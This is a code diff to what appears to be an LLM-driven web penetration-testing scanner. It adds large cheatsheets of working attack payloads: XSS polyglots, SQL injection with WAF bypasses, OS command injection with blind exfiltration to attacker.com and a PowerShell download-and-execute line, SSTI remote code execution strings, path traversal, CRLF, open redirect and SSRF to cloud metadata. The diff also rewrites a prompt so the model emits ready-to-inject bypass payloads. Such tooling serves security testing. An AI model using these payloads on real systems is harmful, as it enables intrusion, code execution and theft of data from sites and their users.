@@ -31,45 +31,125 @@ console = Console()
 
 
 # ---------------------------------------------------------------------------
-# Check-type descriptors — give the LLM more context about the vuln type
+# Check-type cheatsheets — advanced techniques per vuln type
 # ---------------------------------------------------------------------------
 
-_CHECK_DESCRIPTIONS: dict[str, str] = {
-    "xss": (
-        "Cross-Site Scripting — injecting HTML/JS so it executes in a victim's browser. "
-        "Techniques: event handlers, SVG/IMG tags, script tags, javascript: URIs, "
-        "attribute injection, DOM sinks, encoding bypasses."
-    ),
-    "sqli": (
-        "SQL Injection — injecting SQL syntax to manipulate backend database queries. "
-        "Techniques: UNION-based, blind boolean/time-based, error-based, "
-        "stacked queries, second-order injection, WAF bypasses via comments/whitespace."
-    ),
-    "os": (
-        "OS Command Injection — injecting shell meta-characters to run OS commands. "
-        "Techniques: ; | && || $() backticks, newline injection, env var expansion, "
-        "encoded separators, blind OOB exfiltration via DNS/HTTP."
-    ),
-    "ssti": (
-        "Server-Side Template Injection — injecting template engine syntax that the "
-        "server evaluates. Techniques: Jinja2 {{7*7}}, Twig, Freemarker, Smarty, "
-        "Velocity, Mako, Pebble, Thymeleaf. Try multiple engines' syntax."
-    ),
-    "path_traversal": (
-        "Path/Directory Traversal — traversing the file system via ../ sequences "
-        "to read arbitrary files. Techniques: double-dot variants, URL/unicode encoding, "
-        "null byte termination, zip/archive path injection."
-    ),
-    "header_injection": (
-        "HTTP Header Injection — injecting CRLF (\\r\\n) sequences to split HTTP headers. "
-        "Techniques: URL-encoded CRLF, Unicode CRLF variants, response splitting."
-    ),
-    "open_redirect": (
-        "Open Redirect — crafting a URL that redirects to an attacker-controlled host. "
-        "Techniques: protocol-relative //evil.com, javascript: URI, data: URI, "
-        "@-trick user:pass@host, tab/newline chars to bypass validation."
-    ),
+_CHECK_CHEATSHEETS: dict[str, str] = {
+    "xss": """
+ADVANCED XSS TECHNIQUES (use what the standard set missed):
+• Attribute context: close the attribute first → " onmouseover="alert(1)  or ' autofocus onfocus='alert(1)
+• JS string context: break the string → '; alert(1); var x='
+• Script context (no quotes needed): </script><script>alert(1)</script>
+• Tag name alternatives: <details open ontoggle=alert(1)> <marquee onstart=alert(1)> <object data=javascript:alert(1)>
+• Encoding bypasses: \\u003cscript\\u003e | \\x3cscript | &lt;script (check if decoded) | base64 in data:
+• Case/space: <ScRiPt>alert(1)</sCrIpT> | <img/src=x/onerror=alert(1)>
+• SVG: <svg><script>alert&#40;1&#41;</script> | <svg/onload=\\u0061lert(1)>
+• XSS via URL: javascript:/*--></title></style></textarea></script><svg onload=alert(1)>
+• Template literal: ${alert(1)} ← if inside JS template string
+• Mutation XSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
+• Polyglot: jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>/
+""",
+    "sqli": """
+ADVANCED SQL INJECTION TECHNIQUES:
+• UNION column count: ORDER BY 1-- then ORDER BY 2-- until error; then UNION SELECT NULL,NULL...--
+• MySQL error: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+• MSSQL error: ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+• PostgreSQL error: ' AND 1=CAST((SELECT version()) AS int)--
+• Boolean blind: ' AND SUBSTRING(username,1,1)='a'-- vs 'b' (binary search)
+• Time blind MySQL: ' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+• Time blind MSSQL: '; WAITFOR DELAY '0:0:3'--
+• Time blind PgSQL: '; SELECT pg_sleep(3)--
+• WAF comment bypass: '/**/AND/**/1=1-- | /*!50000UNION*/ /*!50000SELECT*/ NULL--
+• WAF case bypass: uNiOn SeLeCt | UnIoN aLl SeLeCt
+• WAF URL encode: %27%20OR%201%3D1-- | %55NION (U encoded)
+• WAF whitespace bypass: '\\t OR\\t1=1-- | '%0aOR%0a1=1--
+• Stacked queries MySQL: '; INSERT INTO users VALUES('hack','hack')--
+• Second-order: inject ' into a stored field that is later used in a query
+""",
+    "os": """
+ADVANCED OS COMMAND INJECTION TECHNIQUES:
+• Separator variety: ; | & && || \\n %0a %3b (URL encoded)
+• Subshell: $(id) `id` $(curl attacker.com/$(id))
+• Blind OOB: ; curl http://attacker.com/$(id|base64) | nslookup $(id).attacker.com
+• Filter bypass (no spaces): {cat,/etc/passwd} | IFS=,;cmd=cat,/etc/passwd;$cmd
+• Filter bypass (no slash): echo${IFS}bHM=|base64${IFS}-d|bash
+• Filter bypass (backtick): echo `id`
+• Windows CMD: & whoami | type C:\\windows\\win.ini | set | dir C:\\
+• Windows PowerShell: ;powershell -enc <base64> | ;powershell IEX(New-Object Net.WebClient).downloadString('http://x/')
+• Encoded newline: cmd%0aid | cmd%0a%0did
+• Double encoding: %2526id (%25 = %, so %2526 = %26 = &)
+• Environment expansion: $PATH $HOME $USER (reveals execution context)
+""",
+    "ssti": """
+ADVANCED SSTI TECHNIQUES:
+• Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+• Jinja2 RCE alt: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}
+• Jinja2 filter bypass: {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}
+• Twig: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+• Freemarker: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+• Velocity: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))
+• Smarty: {php}echo `id`;{/php} or {system('id')}
+• Mako: ${__import__('os').popen('id').read()}
+• Pebble: {%import "java.lang.Runtime"%}{{Runtime.getRuntime().exec("id")}}
+• Thymeleaf: __${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+""",
+    "path_traversal": """
+ADVANCED PATH TRAVERSAL TECHNIQUES:
+• Classic: ../../../etc/passwd | ..\\..\\..\\windows\\win.ini
+• URL encode: ..%2F..%2F..%2Fetc%2Fpasswd
+• Double encode: ..%252F..%252Fetc%252Fpasswd
+• Unicode: ..%c0%af..%c0%afetc%c0%afpasswd | ..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+• Null byte: ../../../etc/passwd%00 | ../../../etc/passwd%00.jpg
+• Absolute: /etc/passwd | C:\\windows\\win.ini | /proc/self/environ
+• Dotless: ....// (when ../ is stripped: ....//..//..//etc/passwd)
+• Mixed slashes: ..\\/..\\/..\\/ etc (mix backslash and forward)
+• Archive path (zip slip): ../../../etc/passwd in ZIP entry filename
+• UNC path (Windows): \\\\127.0.0.1\\C$\\windows\\win.ini
+• PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd
+""",
+    "header_injection": """
+ADVANCED HEADER INJECTION TECHNIQUES:
+• CRLF URL-encoded: %0d%0a | %0D%0A
+• LF only: %0a (some servers accept LF without CR)
+• Unicode: \\u000d\\u000a | \\r\\n
+• Response split: value%0d%0a%0d%0a<html>injected body</html>
+• Set-Cookie: value%0d%0aSet-Cookie:session=evil;Path=/
+• XSS via Content-Type: value%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
+• Cache poison: value%0d%0aX-Forwarded-Host:evil.com
+• Redirect: value%0d%0aLocation:https://evil.com%0d%0a%0d%0a
+• Double encoding: %250d%250a (bypass filters that decode once)
+""",
+    "open_redirect": """
+ADVANCED OPEN REDIRECT TECHNIQUES:
+• Basic: https://evil.com | //evil.com | ///evil.com
+• Protocol-relative: //evil.com/%2F.. | \\\\evil.com
+• URL encode slash: https:/%2Fevil.com | https:/\\evil.com
+• Double encode: https:%2F%2Fevil.com | %68%74%74%70%73:%2F%2Fevil.com
+• @-trick: https://trusted.com@evil.com | https://evil.com%40trusted.com
+• Backslash: https:\\\\evil.com | /\\evil.com
+• Unicode: https://evil．com (fullwidth dot) | https://ⓔvil.com
+• CRLF: %0ahttps://evil.com (header injection leading to redirect)
+• Data URI: data:text/html,<script>location='https://evil.com'</script>
+• Subpath: https://trusted.com.evil.com | https://trusted-evil.com
+""",
+    "ssrf": """
+ADVANCED SSRF TECHNIQUES:
+• Cloud metadata: http://169.254.169.254/ (AWS/Azure) | http://metadata.google.internal/
+• Localhost variants: http://127.0.0.1/ | http://localhost/ | http://[::1]/ | http://0/
+• Decimal IP: http://2130706433/ (127.0.0.1) | http://0x7f000001/ (hex)
+• URL bypass: http://127.1/ | http://127.0.1/ | http://0177.0.0.1/ (octal)
+• DNS rebinding: http://r.milburns.net/ (resolves to 127.0.0.1)
+• IPv6: http://[::ffff:127.0.0.1]/ | http://[0:0:0:0:0:ffff:127.0.0.1]/
+• Scheme abuse: file:///etc/passwd | dict://localhost:6379/ | gopher://localhost:25/
+• Internal port scan: http://127.0.0.1:22/ | http://127.0.0.1:3306/ | http://127.0.0.1:6379/
+• URL encoding bypass: http://%31%32%37%2e%30%2e%30%2e%31/
+• Redirect chain: link to a page that 302-redirects to 169.254.169.254
+""",
 }
+
+
+def _get_cheatsheet(check_type: str) -> str:
+    return _CHECK_CHEATSHEETS.get(check_type, "")
 
 
 # ---------------------------------------------------------------------------
@@ -77,51 +157,79 @@ _CHECK_DESCRIPTIONS: dict[str, str] = {
 # ---------------------------------------------------------------------------
 
 _ADAPTIVE_PROMPT = """\
-You are a world-class web application penetration tester and CTF expert.
-You just ran a standard payload scan on a form field and found no confirmed vulnerability.
-Now analyse the application's filtering behavior and generate advanced bypass payloads.
+You are a world-class web application penetration tester and CTF champion with deep expertise in \
+WAF bypass and advanced injection techniques.
 
-## Target
-URL: {url}
-Field name: {field_name}
-Vulnerability type: {check_type}
+A standard payload scan on the field below produced no confirmed finding. \
+Your job: analyse the application's sanitization behavior from the page HTML, \
+then craft ADVANCED bypass payloads that the standard set missed.
 
-## Vulnerability description
-{check_desc}
+═══════════════════════════════════════════
+TARGET
+═══════════════════════════════════════════
+URL        : {url}
+Field name : {field_name}
+Vuln type  : {check_type}
 
-## Detected WAF / Security Layer
+═══════════════════════════════════════════
+TECHNIQUE CHEATSHEET — {check_type}
+═══════════════════════════════════════════
+{cheatsheet}
+
+═══════════════════════════════════════════
+WAF / SECURITY LAYER
+═══════════════════════════════════════════
 {waf_section}
 
-## Standard payloads already tried (no hit found):
+═══════════════════════════════════════════
+STANDARD PAYLOADS ALREADY TRIED (no hit):
+═══════════════════════════════════════════
 {payloads_tried}
 
-## Page HTML after last probe (first 5000 chars):
-```html
+═══════════════════════════════════════════
+PAGE HTML AFTER LAST PROBE (first 5000 chars):
+═══════════════════════════════════════════
 {page_excerpt}
-```
 
-## Your observations about the application's behavior:
+═══════════════════════════════════════════
+AUTOMATED OBSERVATIONS:
+═══════════════════════════════════════════
 {observations}
 
-## Your task
-Based on the HTML above, deduce HOW the application filters input:
-- Are `<` `>` being HTML-entity-encoded?
-- Are quotes `'` `"` being escaped?
-- Are certain keywords (e.g. "script", "alert", "SELECT") being stripped or blocked?
-- What is the injection context? (HTML body? attribute value? JavaScript string? CSS?)
-- What framework/template engine might be in use?
+═══════════════════════════════════════════
+YOUR TASK
+═══════════════════════════════════════════
+Step 1 — ANALYSE the page HTML above:
+  • Are < > being HTML-entity-encoded (&lt; &gt;)?
+  • Are quotes ' " being escaped or removed?
+  • Are keywords like script/alert/SELECT/UNION being stripped or blocked?
+  • What is the injection context? (HTML body / attribute value / JS string / CSS / JSON)
+  • What server-side framework or template engine might be in use?
+  • Does any payload fragment appear reflected (partial or encoded)?
 
-Then generate 5-10 ADVANCED BYPASS payloads that a human might NOT immediately think of.
-Focus on:
-1. Encoding bypasses: unicode escapes \\uXXXX, hex \\xXX, base64, URL-encoding, HTML entities
-2. Context-aware injection: if inside a JS string → break it; if in an attribute → escape the attr
-3. WAF evasion: case variation, null bytes, comments /**, HTML comments, unusual whitespace
-4. Polyglot payloads that work across multiple injection contexts
-5. Alternative event handlers, tags, or sinks beyond the common ones
-6. Template syntax for multiple engines simultaneously
+Step 2 — GENERATE 8-12 ADVANCED BYPASS payloads that:
+  • Are DIFFERENT from all the already-tried payloads
+  • Target the SPECIFIC filtering behavior you identified
+  • Use techniques from the cheatsheet above
+  • Incorporate WAF-specific bypasses if a WAF is listed
+  • Are ready to inject verbatim — no placeholders, no pseudo-code
 
-Output ONLY the payloads — one per line, no numbering, no explanation, no backticks.
-Each line must be a single ready-to-inject string.
+OUTPUT FORMAT — strictly follow this structure:
+<analysis>
+Write your reasoning here: what filters are active, what injection context you found, \
+what strategy you chose. 2-5 sentences.
+</analysis>
+<payloads>
+payload_1_here
+payload_2_here
+payload_3_here
+</payloads>
+
+CRITICAL RULES:
+• The <payloads> block must contain ONLY raw payloads — one per line
+• NO numbering (1. 2. 3.), NO bullets (- *), NO backticks, NO explanations inside <payloads>
+• Each line = one complete, ready-to-inject string
+• Max 200 characters per payload
 """
 
 
@@ -197,25 +305,31 @@ def _build_observations(page_html: str, payloads_tried: list[str]) -> str:
 
 def _parse_payload_lines(text: str, already_tried: list[str]) -> list[str]:
     """
-    Parse LLM output — one payload per line.
-    Filter out empty lines, prose, and duplicates of already-tried payloads.
+    Parse LLM output.
+    Prefers <payloads>...</payloads> tag content; falls back to full text.
+    Filters out empty lines, prose, and duplicates of already-tried payloads.
     """
     tried_set = set(p.strip() for p in already_tried)
+
+    # Prefer structured tag output
+    tag_match = re.search(r"<payloads>(.*?)</payloads>", text, re.DOTALL)
+    lines_source = tag_match.group(1) if tag_match else text
+
     result: list[str] = []
-    for line in text.splitlines():
+    for line in lines_source.splitlines():
         line = line.strip()
         if not line:
             continue
-        # Skip obvious prose/explanation lines
+        # Skip lines that are too long to be a single payload
         if len(line) > 200:
             continue
-        # Skip lines that look like numbered list items without a payload
+        # Skip lines that look like numbered list items without payload content
         if re.match(r"^\d+\.\s*$", line):
             continue
-        # Skip lines that are pure prose (no special chars typical of payloads)
+        # Skip pure prose lines (only letters and spaces, no injection chars)
         if re.match(r"^[A-Za-z][a-z ]+:?\s*$", line) and len(line) > 20:
             continue
-        # Remove leading numbering like "1. " or "- "
+        # Remove leading numbering like "1. " "2) " or bullet "- " "* "
         line = re.sub(r"^[\d]+[\.\)]\s+", "", line)
         line = re.sub(r"^[-*]\s+", "", line)
         if line and line not in tried_set:
@@ -258,7 +372,7 @@ class AdaptivePayloadEngine:
         if not await self.pg._check_llm_available():
             return []
 
-        check_desc = _CHECK_DESCRIPTIONS.get(check_type, check_type)
+        cheatsheet = _get_cheatsheet(check_type)
         observations = _build_observations(page_html, payloads_tried)
         payloads_list = "\n".join(f"  {p}" for p in payloads_tried[:30]) or "  (none recorded)"
         page_excerpt = page_html[:5000].replace("```", "'''")
@@ -268,18 +382,18 @@ class AdaptivePayloadEngine:
             hints = _WAF_BYPASSES.get(waf_name, _WAF_BYPASSES.get("Generic WAF", []))
             hints_text = "\n".join(f"  - {h}" for h in hints)
             waf_section = (
-                f"**{waf_name}** is protecting the target.\n"
+                f"DETECTED WAF: {waf_name}\n"
                 f"Known bypass techniques for {waf_name}:\n{hints_text}\n"
-                f"Incorporate these evasion strategies into your payloads."
+                f"You MUST incorporate these evasion strategies into your payloads."
             )
         else:
-            waf_section = "No WAF detected — standard payloads expected to pass through."
+            waf_section = "No WAF detected — focus on application-level filtering bypasses."
 
         prompt = _ADAPTIVE_PROMPT.format(
             url=url,
             field_name=field_name,
             check_type=check_type,
-            check_desc=check_desc,
+            cheatsheet=cheatsheet,
             waf_section=waf_section,
             payloads_tried=payloads_list,
             page_excerpt=page_excerpt,
